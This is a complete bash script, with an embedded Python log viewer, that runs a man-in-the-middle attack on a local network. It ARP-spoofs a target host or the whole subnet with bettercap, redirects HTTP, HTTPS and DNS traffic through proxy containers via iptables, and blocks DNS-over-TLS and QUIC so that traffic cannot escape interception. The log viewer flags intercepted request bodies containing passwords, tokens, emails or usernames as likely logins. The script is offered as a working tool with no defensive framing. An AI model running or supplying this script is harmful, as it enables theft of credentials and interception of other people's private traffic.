#!/bin/bash

read -p "Target IP / CIDR (blank = whole subnet): " TARGET
read -p "Attack Interface: " INTERFACE

MY_IP=$(ip -4 addr show "$INTERFACE" | grep -oP '(?<=inet )\d+(\.\d+){3}')
echo "Local IP: $MY_IP"

if [ -z "$TARGET" ]; then
    TARGET=$(ip -4 -o addr show "$INTERFACE" | awk '{print $4}' | head -n1 \
             | awk -F/ '{split($1,a,"."); print a[1]"."a[2]"."a[3]".0/"$2}')
    echo "No target given - spoofing whole subnet: $TARGET"
fi

# Pick whichever compose CLI is available (v2 plugin vs. legacy v1 binary).
if sudo docker compose version >/dev/null 2>&1; then
    DC="docker compose"
elif command -v docker-compose >/dev/null 2>&1; then
    DC="docker-compose"
else
    echo "neither 'docker compose' nor 'docker-compose' found" >&2
    exit 1
fi

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

sudo $DC up -d --build

# Surface any container that immediately crash-loops instead of failing silently.
sleep 2
for c in http-s-proxy dns-filter; do
    state=$(sudo docker inspect -f '{{.State.Status}}' "$c" 2>/dev/null)
    if [ "$state" != "running" ]; then
        echo "WARNING: container $c is $state. Last log lines:"
        sudo docker logs --tail 20 "$c" 2>&1 | sed 's/^/    /'
    fi
done

GATEWAY=$(ip route show dev "$INTERFACE" | awk '/^default/{print $3; exit}')
if [ -n "$GATEWAY" ]; then
    echo "Priming ARP cache for gateway $GATEWAY ..."
    ping -c 2 -W 1 -I "$INTERFACE" "$GATEWAY" >/dev/null 2>&1 || true
fi

sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80  ! -d "$MY_IP" -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 ! -d "$MY_IP" -j REDIRECT --to-port 443
sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 80  -j ACCEPT
sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 443 -j ACCEPT

# DNS interception
sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 -j REDIRECT --to-ports 5300
sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 53 -j REDIRECT --to-ports 5300
sudo iptables -A INPUT -i "$INTERFACE" -p udp --dport 5300 -j ACCEPT
sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 5300 -j ACCEPT

# Kill DNS-over-TLS
sudo iptables -I FORWARD -i "$INTERFACE" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
sudo iptables -I FORWARD -i "$INTERFACE" -p udp --dport 853 -j REJECT --reject-with icmp-port-unreachable

# Kill HTTP/3 / QUIC
sudo iptables -I FORWARD -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable
sudo iptables -I INPUT   -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable

# Pretty log viewer
cat > /tmp/logviewer.py <<'PYEOF'
#!/usr/bin/env python3
import sys, json, urllib.parse

RED, CYAN, DIM, RESET = '\033[31;1m', '\033[36m', '\033[2m', '\033[0m'
LOGIN_KEYS = {"password", "passwd", "pass", "pwd",
              "login", "signin", "sign_in",
              "token", "email", "username", "user", "account", "secret"}

def strip_query(u):
    return (u or "/").split("?", 1)[0]

def strip_port(a):
    if not a:
        return "?"
    return a.rsplit(":", 1)[0] if ":" in a else a

def parse_body(body, ct):
    ct = (ct or "").lower()
    if "x-www-form-urlencoded" in ct:
        try:
            return dict(urllib.parse.parse_qsl(body, keep_blank_values=True))
        except Exception:
            return None
    if "application/json" in ct or body[:1] in "{[":
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                return {k: (v if isinstance(v, str) else json.dumps(v))
                        for k, v in obj.items()}
        except Exception:
            return None
    return None

def looks_like_login(uri, body):
    hay = (uri + " " + body).lower()
    return any(kw in hay for kw in LOGIN_KEYS)

for line in sys.stdin:
    try:
        e = json.loads(line.strip())
    except Exception:
        continue
    msg = e.get("msg")
    if msg == "handled request":
        r = e.get("request", {})
        ip     = strip_port(r.get("remote_ip", "?"))
        method = r.get("method", "?")
        host   = r.get("host", "?")
        uri    = strip_query(r.get("uri", "/"))
        status = e.get("status", "?")
        dur    = e.get("duration", 0)
        print(f"ACCESS [{ip}]  {method} {host}{uri}  {status} ({dur:.3f}s)",
              flush=True)
    elif msg == "request body":
        ip     = strip_port(e.get("remote_ip", "?"))
        method = e.get("method", "?")
        host   = e.get("host", "?")
        uri    = strip_query(e.get("uri", "/"))
        ct     = e.get("content_type", "") or ""
        body   = e.get("body", "") or ""
        login  = looks_like_login(uri, body)
        color  = RED if login else CYAN
        tag    = "*** LIKELY LOGIN ***" if login else "BODY"
        print(f"{color}{tag} [{ip}]  {method} {host}{uri}{RESET}",
              flush=True)
        parsed = parse_body(body, ct)
        if parsed:
            w = max((len(k) for k in parsed), default=4)
            for k, v in parsed.items():
                if len(v) > 200:
                    v = v[:200] + "..."
                print(f"{color}  {k.upper():<{w}} : {v}{RESET}", flush=True)
        else:
            snippet = body if len(body) <= 300 else body[:300] + "..."
            print(f"{DIM}  (CT={ct or 'unknown'}){RESET}", flush=True)
            print(f"{color}  RAW : {snippet}{RESET}", flush=True)
PYEOF

cat > /tmp/tail-logs.sh <<EOF
#!/bin/bash
if ! command -v python3 >/dev/null 2>&1; then
    echo "python3 missing - showing raw logs. sudo apt install -y python3" >&2
    exec sudo $DC logs -f --no-log-prefix http-s-proxy
fi
sudo $DC logs -f --no-log-prefix http-s-proxy 2>&1 | python3 /tmp/logviewer.py
EOF
chmod +x /tmp/tail-logs.sh

# Spawn it in a new terminal window. Try the common Kali/Debian emulators.
LOG_TERM_PID=""
for term in x-terminal-emulator qterminal xfce4-terminal konsole gnome-terminal xterm; do
    if command -v "$term" >/dev/null 2>&1; then
        case "$term" in
            gnome-terminal) setsid "$term" -- /tmp/tail-logs.sh >/dev/null 2>&1 & ;;
            *)              setsid "$term" -e /tmp/tail-logs.sh >/dev/null 2>&1 & ;;
        esac
        LOG_TERM_PID=$!
        echo "Access log window opened via $term (pid $LOG_TERM_PID)."
        break
    fi
done
if [ -z "$LOG_TERM_PID" ]; then
    echo "No terminal emulator found; run /tmp/tail-logs.sh manually in another shell."
fi

sed "s|TARGET_PLACEHOLDER|$TARGET|" spoof.cap > /tmp/active.cap
sudo bettercap -caplet /tmp/active.cap -iface "$INTERFACE"

# cleanup
sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 80  ! -d "$MY_IP" -j REDIRECT --to-port 80
sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 443 ! -d "$MY_IP" -j REDIRECT --to-port 443
sudo iptables -D INPUT -i "$INTERFACE" -p tcp --dport 80  -j ACCEPT
sudo iptables -D INPUT -i "$INTERFACE" -p tcp --dport 443 -j ACCEPT
sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p udp --dport 53 -j REDIRECT --to-ports 5300
sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 53 -j REDIRECT --to-ports 5300
sudo iptables -D INPUT -i "$INTERFACE" -p udp --dport 5300 -j ACCEPT
sudo iptables -D INPUT -i "$INTERFACE" -p tcp --dport 5300 -j ACCEPT
sudo iptables -D FORWARD -i "$INTERFACE" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
sudo iptables -D FORWARD -i "$INTERFACE" -p udp --dport 853 -j REJECT --reject-with icmp-port-unreachable
sudo iptables -D FORWARD -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable
sudo iptables -D INPUT   -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable

sudo $DC down

# Log tail dies on its own once the container is down, but nuke its window
# process group in case the terminal lingers.
if [ -n "$LOG_TERM_PID" ]; then
    kill -- -"$LOG_TERM_PID" 2>/dev/null
fi

sudo rm -f /tmp/active.cap /tmp/tail-logs.sh /tmp/logviewer.py

echo "Done."
